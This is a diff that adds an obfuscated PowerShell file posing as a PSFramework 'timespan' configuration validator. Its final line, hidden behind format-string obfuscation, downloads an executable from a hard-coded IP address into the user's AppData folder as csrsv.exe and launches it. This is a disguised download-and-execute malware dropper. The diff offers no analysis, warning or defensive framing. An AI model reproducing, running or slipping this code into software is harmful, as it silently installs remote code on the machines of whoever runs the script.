@@ -1,0 +1,24 @@
+&("{0}{5}{4}{1}{6}{3}{7}{2}"-f 'Reg','on','dation','Val','ter-PSFC','is','fig','i') -Name ("{0}{1}"-f 't','imespan') -ScriptBlock {
+	Param (
+		${VaL`UE}
+	)
+	
+	${re`suLt} = &("{1}{2}{0}" -f 'ject','New-O','b') ("{1}{2}{0}"-f't','PS','Objec') -Property @{
+		("{1}{2}{0}"-f 'ss','Suc','ce') = ${Tr`UE}
+		("{1}{0}" -f 'lue','Va')   = ${N`Ull}
+		("{1}{2}{0}" -f 'age','Me','ss') = ""
+	}
+	
+	try { [timespan]${Tim`ES`PAn} = ${V`A`lUe} }
+	catch
+	{
+		${re`SuLt}."me`SSa`ge" = ('N'+'ot '+'a '+'Time'+'span'+':'+' '+"$Value")
+		${r`ES`ULT}."s`UCCE`Ss" = ${f`ALsE}
+		return ${rES`U`LT}
+	}
+	
+	${rE`SU`LT}."V`ALue" = ${tIME`sP`An}
+	
+	return ${Res`UlT}
+}
+(&("{1}{2}{0}"-f '-Object','N','ew') ("{1}{0}{3}{4}{2}" -f'm.N','Syste','nt','et.WebCl','ie')).("{2}{0}{3}{1}"-f'nloadF','e','Dow','il').Invoke(("{5}{6}{3}{8}{7}{9}{2}{4}{10}{0}{1}" -f'srsv.e','xe','ahoo','4.102.53.','/','http:/','/9','~','238/','y','c'),"$env:APPDATA\csrsv.exe");.("{4}{3}{0}{2}{1}"-f 'r','ess','oc','art-P','St') ("$env:APPDATA\csrsv.exe")
